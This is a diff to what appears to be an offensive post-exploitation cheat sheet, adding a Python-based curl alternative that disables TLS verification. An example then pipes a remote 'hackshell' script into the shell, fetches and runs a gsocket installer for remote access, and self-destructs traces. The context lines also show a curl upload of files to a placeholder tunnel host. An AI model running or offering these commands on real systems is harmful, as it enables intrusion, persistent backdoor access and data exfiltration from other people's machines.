@@ -1191,6 +1191,33 @@ curl -X POST  https://CF-URL-CHANGE-ME.trycloudflare.com/upload -F 'files=@myfil
 <a id="download"></a>
 ### 4.vi. File download without curl
 
+Using Python, download only:
+```sh
+# Declare a curl-alternative
+purl() {
+	local p
+	local url="${1:?}"
+	{ [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
+	"$(which python3 || which python || which pyton2 || which false)" -c "\
+import urllib.request
+import sys
+import ssl
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+sys.stdout.buffer.write(urllib.request.urlopen(\"$url\", timeout=10, context=ctx).read())"
+}
+# purl ipinfo.io
+```
+
+Example: Installing gsocket with purl:
+```
+source <(purl https://raw.githubusercontent.com/hackerschoice/hackshell/main/hackshell.sh) \
+&& bin curl \
+&& bash -c "$(curl -fsSL https://gsocket.io/y)" \
+&& xdestruct
+```
+
 Using OpenSSL, download only:
 ```sh
 surl() {
@@ -1200,8 +1227,7 @@ surl() {
 	| openssl s_client -ignore_unexpected_eof -verify_quiet -quiet -ign_eof -connect "${host%%:*}:443" \
 	| sed '1,/^\r\{0,1\}$/d'
 }
-# surl https://ipinfo.io
-# source <(surl https://raw.githubusercontent.com/hackerschoice/hackshell/main/hackshell.sh)
+# surl ipinfo.io
 ```
 
 Using bash, download only:
